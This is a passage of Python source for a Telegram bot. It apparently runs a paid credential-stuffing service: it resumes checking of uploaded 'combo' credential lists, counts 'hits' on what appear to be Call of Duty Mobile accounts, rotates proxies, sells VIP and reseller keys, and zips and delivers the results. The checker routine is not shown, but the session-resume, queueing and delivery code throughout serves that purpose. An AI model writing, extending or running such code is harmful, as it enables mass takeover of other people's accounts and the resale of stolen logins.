            for uid2, sd in list(load_persisted_sessions().items()):
                fpath=sd.get("file",""); cid2=sd.get("chat_id")
                lk2=sd.get("lvl_key","lvl_all"); ck2=sd.get("cf_key","cf_both")
                fname2=sd.get("first_name","User"); uname2=sd.get("username","")
                if not fpath or not cid2:
                    clear_persisted_session(uid2); continue
                if not Path(fpath).exists():
                    clear_persisted_session(uid2)
                    try:
                        await application.bot.send_message(
                            chat_id=int(cid2), parse_mode=ParseMode.HTML,
                            text=(f" <b>Session Recovery Failed</b>\n"
                                  f"━━━━━━━━━━━━━━━━━━━━\n"
                                  f"Hi <b>{fname2}</b>, the bot restarted but your combo "
                                  f"file was not found.\nPlease upload your file again via /start."))
                    except: pass
                    continue
                # Count remaining lines
                try:
                    with open(fpath,"r",encoding="utf-8",errors="ignore") as _f:
                        rem2=sum(1 for ln in _f if ln.strip() and not ln.strip().startswith("==="))
                except: rem2=0
                _ckpt2 = Path(str(fpath) + ".ckpt")
                if _ckpt2.exists():
                    try:
                        with open(_ckpt2,"r",encoding="utf-8") as _cf:
                            _done2 = {int(l.strip()) for l in _cf if l.strip().isdigit()}
                        if rem2 > 0 and len(_done2) >= rem2:
                            log.info(f"Auto-resume uid={uid2}: all {rem2} lines already done "
                                     f"(checkpoint has {len(_done2)} entries) — cleaning up stale session")
                            clear_persisted_session(uid2)
                            try: _ckpt2.unlink()
                            except: pass
                            try:
                                await application.bot.send_message(
                                    chat_id=int(cid2), parse_mode=ParseMode.HTML,
                                    text=(f" <b>Session Already Complete</b>\n"
                                          f"━━━━━━━━━━━━━━━━━━━━\n"
                                          f"Hi <b>{fname2}</b>, your previous session had already "
                                          f"finished all <code>{rem2:,}</code> lines before the bot "
                                          f"restarted.\n\n"
                                          f" No new results to send.\n"
                                          f"Use /start to begin a new session."))
                            except: pass
                            continue
                    except: pass
                ll2=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["label"]
                cl2_label=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["label"]
                clf2_label=CLEAN_OPTIONS.get(ck2,CLEAN_OPTIONS["cf_both"])["label"]
                thr2=LEVEL_OPTIONS.get(lk2,LEVEL_OPTIONS["lvl_all"])["threshold"]
                clf2=CLEAN_OPTIONS.get(ck2,CLEAN_OPTIONS["cf_both"])["filter"]
                threads2=cfg2.get("default_threads",5)
                udb2=load_users()
                _hits_on2=udb2.get(uid2,{}).get("hits_notif",False)
                btok2=cfg2["bot_token"] if _hits_on2 else None
                isv2=udb2.get(uid2,{}).get("vip",False) or is_admin(int(uid2),cfg2)
                lim2=cfg2.get("vip_limit") if isv2 else cfg2.get("global_limit")
                disp2=min(lim2,rem2) if lim2 else rem2
                combo2=Path(fpath)
                ts2=datetime.now().strftime("%Y%m%d_%H%M%S")
                saved_rf=sd.get("result_folder","")
                if saved_rf and Path(saved_rf).exists():
                    rf2=Path(saved_rf)
                    log.info(f"Resume: reusing existing result folder {rf2}")
                else:
                    rf2=RESULTS_DIR/uid2/ts2; rf2.mkdir(parents=True,exist_ok=True)
                    log.info(f"Resume: created new result folder {rf2}")
                saved_orig=sd.get("orig_total",rem2)
                if saved_orig<rem2: saved_orig=rem2
                prev_processed=max(0, saved_orig-rem2)
                stop_ev2=threading.Event()
                saved_snap=sd.get("live_stats_snapshot",{})
                prev_stats2=saved_snap if saved_snap else get_folder_stats(str(rf2))
                if prev_stats2:
                    prev_stats2.setdefault("valid",0); prev_stats2.setdefault("invalid",0)
                    prev_stats2.setdefault("clean",0); prev_stats2.setdefault("not_clean",0)
                    prev_stats2.setdefault("has_codm",0); prev_stats2.setdefault("no_codm",0)
                with sessions_lock:
                    active_sessions[uid2]={
                        "status":"checking","file":fpath,
                        "stop_event":stop_ev2,"chat_id":cid2,
                        "lvl_key":lk2,"cf_key":ck2,
                        "result_folder":str(rf2),
                        "orig_total":saved_orig,
                        "prev_processed":prev_processed,
                        "prev_stats":prev_stats2,
                    }
                try:
                    _,_,prev_hits=parse_result_stats(str(rf2))
                except: prev_hits=0
                if prev_hits==0 and prev_stats2:
                    prev_hits=prev_stats2.get("has_codm",0)
                try:
                    smsg2=await application.bot.send_message(
                        chat_id=int(cid2), parse_mode=ParseMode.HTML,
                        text=(f" <b>Auto-Resuming!</b>\n"
                              f"━━━━━━━━━━━━━━━━━━━━\n"
                              f" Hi <b>{fname2}</b>{'  @'+uname2 if uname2 else ''}\n"
                              f" File       : <code>{combo2.name}</code>\n"
                              f" Total lines: <code>{saved_orig:,}</code>\n"
                              f" Remaining  : <code>{rem2:,}</code> lines to process\n"
                              f" Pre-crash hits: <code>{prev_hits:,}</code> (preserved)\n"
                              f" Level      : {cl2_label}\n"
                              f" Filter     : {clf2_label}\n"
                              f"━━━━━━━━━━━━━━━━━━━━\n"
                              f" Hits sent here live!\n /check   /stop"))
                    smsg2_id = smsg2.message_id if smsg2 else None
                    if smsg2: track(uid2, smsg2_id)
                except Exception as e:
                    log.warning(f"Auto-resume notify failed for {uid2}: {e}")
                    smsg2_id = None
                persist_session(uid2, {
                    "file":fpath,"chat_id":cid2,"lvl_key":lk2,"cf_key":ck2,
                    "username":uname2,"first_name":fname2,
                    "status":"checking","status_msg_id":smsg2_id,
                    "result_folder":str(rf2),
                    "orig_total":saved_orig,
                    "live_stats_snapshot":prev_stats2,
                })
                _status_stop2=threading.Event()
                def _make_status_loop(u,combo_p,orig_n,prev_proc,ll_s,cl_s,cid_n,msg_id,sstop,rf_base,ts_base,prev_s=None):
                    _pc=[1]
                    def _loop():
                        while not sstop.wait(180):
                            with sessions_lock: s3=active_sessions.get(u,{})
                            if s3.get("status")!="checking": break
                            ls3=s3.get("live_stats")
                            if ls3 is not None:
                                cur3_raw=ls3.get_stats()
                                update_persisted_stats(u, cur3_raw)
                                curr3=cur3_raw.get("total",0)
                                done3=prev_proc+curr3
                                if orig_n and done3>orig_n: done3=orig_n
                                if prev_s:
                                    display3=dict(cur3_raw)
                                    for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                        display3[_k]=cur3_raw.get(_k,0)+prev_s.get(_k,0)
                                    display3["total"]=done3
                                else:
                                    display3=dict(cur3_raw)
                                    display3["total"]=done3
                                card3=stats_card(done3,orig_n,display3,ll_s,cl_s,
                                                 result_folder=str(rf_base))
                                if msg_id:
                                    try:
                                        asyncio.run_coroutine_threadsafe(
                                            application.bot.edit_message_text(
                                                chat_id=cid_n,message_id=msg_id,
                                                text=card3,parse_mode=ParseMode.HTML),loop2)
                                    except: pass
                            try:
                                cur_rf3=Path(s3.get("result_folder",str(rf_base)))
                                rfiles3=[f for f in cur_rf3.rglob("*")
                                         if f.is_file() and not f.name.endswith(".zip")]
                                fsz3=sum(f.stat().st_size for f in rfiles3)
                                if fsz3 >= int(TG_MAX_BYTES*0.85):
                                    pz3=cur_rf3/f"results_{u}_{ts_base}_auto{_pc[0]}.zip"
                                    with zipfile.ZipFile(pz3,"w",zipfile.ZIP_DEFLATED) as zf:
                                        for f in rfiles3: zf.write(f,f.relative_to(cur_rf3))
                                    ls4=s3.get("live_stats")
                                    snap4=ls4.get_stats() if ls4 else {}
                                    asyncio.run_coroutine_threadsafe(
                                        deliver_results(application.bot,cid_n,u,[pz3],snap4,
                                                        combo_file=None,partial=True),loop2)
                                    for f in rfiles3:
                                        try: f.unlink()
                                        except: pass
                                    _pc[0]+=1
                            except: pass
                    return _loop
                threading.Thread(
                    target=_make_status_loop(uid2,fpath,saved_orig,prev_processed,
                                             cl2_label,clf2_label,int(cid2),smsg2_id,
                                             _status_stop2,rf2,ts2,prev_s=prev_stats2),
                    daemon=True,name=f"status-{uid2}").start()
                def _make_bg(u,combo_p,rf_p,lim_n,thr_n,stop_e,btok_n,cid_n,
                              thr_list,clf_n,orig_n,prev_proc,ts_n,smsg_id,sstop,ll_s,cl_s,prev_s=None):
                    def _bg():
                        _enqueue(u)
                        pos=_queue_pos(u)
                        if pos>1:
                            asyncio.run_coroutine_threadsafe(application.bot.send_message(
                                chat_id=cid_n,
                                text=f" <b>Queue Position: #{pos}</b>\nWaiting for a free slot…\nUse /stop to cancel.",
                                parse_mode=ParseMode.HTML),loop2)
                        _checker_semaphore.acquire(); _dequeue(u)
                        with sessions_lock:
                            if active_sessions.get(u,{}).get("status")!="checking" or stop_e.is_set():
                                _checker_semaphore.release(); sstop.set(); return
                        try:
                            st3=run_checker(u,Path(combo_p),rf_p,lim_n,thr_n,stop_e,
                                            btok_n,cid_n,thr_list,clf_n,is_resume=True)
                            final_stats=dict(st3)
                            if prev_s:
                                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                    final_stats[_k]=st3.get(_k,0)+prev_s.get(_k,0)
                            final_stats["total"]=prev_proc+st3.get("total",0)
                            st3=final_stats
                            u3=load_users()
                            if u in u3:
                                u3[u]["total_checked"]+=st3.get("total",0)
                                u3[u]["sessions_count"]+=1; save_users(u3)
                            zo3=rf_p/f"results_{u}_{ts_n}.zip"
                            zp3=zip_results(rf_p,zo3)
                            note3=" (Stopped)" if stop_e.is_set() else ""
                            asyncio.run_coroutine_threadsafe(
                                deliver_results(application.bot,cid_n,u,zp3,st3,
                                                combo_file=Path(combo_p),note=note3),loop2)
                        except Exception as ex3:
                            asyncio.run_coroutine_threadsafe(application.bot.send_message(
                                chat_id=cid_n,
                                text=f" <b>Error:</b> <code>{str(ex3)[:300]}</code>",
                                parse_mode=ParseMode.HTML),loop2)
                        finally:
                            sstop.set()
                            _checker_semaphore.release()
                            inc_session(u)
                            del_combo(Path(combo_p))
                            clear_persisted_session(u)
                            with sessions_lock:
                                if u in active_sessions:
                                    active_sessions[u]["status"]="done"
                                    try:
                                        _ls=active_sessions[u].get("live_stats")
                                        _ps2=active_sessions[u].get("prev_stats",{})
                                        _pp2=active_sessions[u].get("prev_processed",0)
                                        _cs2=_ls.get_stats() if _ls else {}
                                        _fs2=dict(_cs2)
                                        if _ps2:
                                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                                                _fs2[_k]=_cs2.get(_k,0)+_ps2.get(_k,0)
                                        _fs2["total"]=_pp2+_cs2.get("total",0)
                                        active_sessions[u]["final_stats"]=_fs2
                                    except: pass
                    return _bg
                t2=threading.Thread(
                    target=_make_bg(uid2,fpath,rf2,lim2,threads2,stop_ev2,btok2,
                                    int(cid2),thr2,clf2,saved_orig,prev_processed,
                                    ts2,smsg2_id,_status_stop2,cl2_label,clf2_label,
                                    prev_s=prev_stats2),
                    daemon=True,name=f"checker-{uid2}")
                t2.start()
                with sessions_lock:
                    active_sessions[uid2]["thread"]=t2
                log.info(f" Auto-resumed checker for uid={uid2} file={Path(fpath).name} rem={rem2:,}")
                await asyncio.sleep(0.5)
        _orig_auto_resume = _auto_resume
        async def _post_init_all(app2):
            await _orig_auto_resume(app2)
            await _set_bot_commands(app2)
        app.post_init = _post_init_all
    else:
        app.post_init = _set_bot_commands

    def _register_handlers(application):
        application.add_handler(CommandHandler("start",           cmd_start))
        application.add_handler(CommandHandler("redeem",          cmd_redeem))
        application.add_handler(CommandHandler("stop",            cmd_stop))
        application.add_handler(CommandHandler("cancel",          cmd_cancel))
        application.add_handler(CommandHandler("hitson",          cmd_hits_on))
        application.add_handler(CommandHandler("hitsoff",         cmd_hits_off))
        application.add_handler(CommandHandler("deletefile",      cmd_delete_file))
        application.add_handler(CommandHandler("status",          cmd_status))
        application.add_handler(CommandHandler("check",           cmd_check))
        application.add_handler(CommandHandler("myresultsfile",   cmd_myresultsfile))
        application.add_handler(CommandHandler("clean",           cmd_clean))
        application.add_handler(CommandHandler("myinfo",          cmd_myinfo))
        application.add_handler(CommandHandler("help",            cmd_help))
        application.add_handler(CommandHandler("announcement",    cmd_announcement))
        application.add_handler(CommandHandler("rgenkey",         cmd_reseller_gen_key))
        application.add_handler(CommandHandler("generate_key",    cmd_generate_key))
        application.add_handler(CommandHandler("remove_key",      cmd_remove_key))
        application.add_handler(CommandHandler("ban_user",        cmd_ban_user))
        application.add_handler(CommandHandler("unban_user",      cmd_unban_user))
        application.add_handler(CommandHandler(["lockAll","lockall"],    cmd_lock_all))
        application.add_handler(CommandHandler(["unlockAll","unlockall"],cmd_unlock_all))
        application.add_handler(CommandHandler("stopall",         cmd_stop_all_checking))
        application.add_handler(CommandHandler("continueall",     cmd_continue_all_checking))
        application.add_handler(CommandHandler("stopforvip",      cmd_stop_for_vip))
        application.add_handler(CommandHandler("stopfornonvip",   cmd_stop_for_nonvip))
        application.add_handler(CommandHandler("stopforuser",     cmd_stop_for_user))
        application.add_handler(CommandHandler("addvip",          cmd_add_vip))
        application.add_handler(CommandHandler("removevip",       cmd_remove_vip))
        application.add_handler(CommandHandler("checkalluser",    cmd_check_all_users))
        application.add_handler(CommandHandler("stats",           cmd_stats))
        application.add_handler(CommandHandler("broadcast",       cmd_broadcast))
        application.add_handler(CommandHandler("setlimit",        cmd_set_limit))
        application.add_handler(CommandHandler("setlimitforvip",  cmd_set_limit_vip))
        application.add_handler(CommandHandler("setcd",           cmd_set_cd))
        application.add_handler(CommandHandler("userinfo",        cmd_userinfo))
        application.add_handler(CommandHandler("topusers",        cmd_topusers))
        application.add_handler(CommandHandler("sysinfo",         cmd_sysinfo))
        application.add_handler(CommandHandler("maintenance",     cmd_maintenance))
        application.add_handler(CommandHandler("setannouncement", cmd_set_announcement))
        application.add_handler(CommandHandler("setmlimit",       cmd_set_mlimit))
        application.add_handler(CommandHandler("keyinfo",         cmd_keyinfo))
        application.add_handler(CommandHandler("batchkey",        cmd_batchkey))
        application.add_handler(CommandHandler("usernote",        cmd_usernote))
        application.add_handler(CommandHandler("setuserlimit",    cmd_set_user_limit))
        application.add_handler(CommandHandler("setconcurrent",   cmd_set_concurrent))
        application.add_handler(CommandHandler("stopchecking",    cmd_stop_checking))
        application.add_handler(CommandHandler("continuechecking",cmd_continue_checking))
        application.add_handler(CommandHandler("stopnonvip",      cmd_stop_nonvip))
        application.add_handler(CommandHandler("refreshcombo",    cmd_refresh_combo))
        application.add_handler(CommandHandler("refreshresults",  cmd_refresh_results))
        application.add_handler(CommandHandler("checkrunning",    cmd_check_running))
        application.add_handler(CommandHandler("checkproxy",      cmd_check_proxy))
        application.add_handler(CommandHandler("pasteproxy",      cmd_paste_proxy))
        application.add_handler(CommandHandler("upload_proxy",    cmd_upload_proxy))
        application.add_handler(CommandHandler("proxystatus",     cmd_proxy_status))
        application.add_handler(CommandHandler("removeproxy",     cmd_remove_proxy))
        application.add_handler(CommandHandler("admin",           cmd_admin_panel))
        application.add_handler(CommandHandler("reloadbot",       cmd_reload_bot))
        application.add_handler(CommandHandler("refresh",         cmd_refresh))
        application.add_handler(CommandHandler("setcommands",     cmd_set_commands))
        application.add_handler(CommandHandler("senddata",        cmd_send_data))
        application.add_handler(CommandHandler("replacefile",     cmd_replace_file))
        application.add_handler(CommandHandler("cancel_replace",  cmd_cancel_replace))
        application.add_handler(CommandHandler("miniadminpanel",      cmd_mini_admin_panel))
        application.add_handler(CommandHandler("removeminiadmin",     cmd_remove_mini_admin))
        application.add_handler(CommandHandler("miniadminlist",       cmd_mini_admin_list))
        application.add_handler(CommandHandler("miniadmininfo",       cmd_mini_admin_info))
        application.add_handler(CommandHandler("demo",            cmd_demo))
        application.add_handler(CommandHandler("buy",             cmd_buy))
        application.add_handler(MessageHandler(filters.PHOTO,                  on_photo))
        application.add_handler(MessageHandler(filters.Document.ALL,           on_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
        application.add_handler(CallbackQueryHandler(on_callback))

    _register_handlers(app)
    print("  Bot is live! Ctrl+C to stop.\n")
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES,
                        drop_pending_updates=False)
    except Exception as e:
        import traceback
        traceback.print_exc()
        print("\nBot crashed. Press Enter to exit.")
        input()

if __name__ == "__main__":
    main()